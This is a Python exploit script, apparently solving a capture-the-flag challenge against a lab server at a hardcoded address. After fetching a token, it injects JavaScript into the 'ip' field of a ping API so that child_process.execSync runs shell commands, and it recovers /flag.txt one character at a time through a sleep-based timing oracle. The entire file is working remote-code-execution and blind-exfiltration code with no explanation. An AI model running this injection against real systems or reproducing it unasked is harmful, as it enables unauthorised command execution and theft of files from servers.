import time
import requests
import json

DELAY = 2
server = "94.237.59.207"
port = 59196

url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
ping_endpoint = f"{url}/api/service/ping"

def get_token():
    headers = {"Content-Type": "application/json"}
    data = {
        "uid": "user123",
        "sid": "user123abcdefghij3f7"
    }
    response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
    return response.json()['token']

def oracle(pos, char, token):
    start = time.time()
    payload = {
        "external": "true", 
        "ip": f"{{}}');uip='1.1.1.1';console.log(child_process.execSync('cut -c {pos} /flag.txt | {{ read c; if [ \"$c\" = \"{char}\" ]; then sleep {DELAY}; fi; }}'))//"
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(ping_endpoint, headers=headers, data=json.dumps(payload))
    return time.time() - start > DELAY

def escape_char(char):
    if char.isalnum():
        return char
    return '\\' + char

def find_chars(token):
    pos = 1
    found_chars = []
    while len(found_chars) < 36:
        char_found = False
        for char_code in range(32, 127):
            char = chr(char_code)
            escaped_char = escape_char(char)
            if oracle(pos, escaped_char, token):
                found_chars.append(char)
                print(char, end='', flush=True)
                char_found = True
                break
        if not char_found:
            print("\nNo new character found. Stopping execution.", flush=True)
            break
        pos += 1
    return found_chars


# Example usage
token = get_token()
print("[*] The flag is: ", end='', flush=True)
found_chars = find_chars(token)
print()
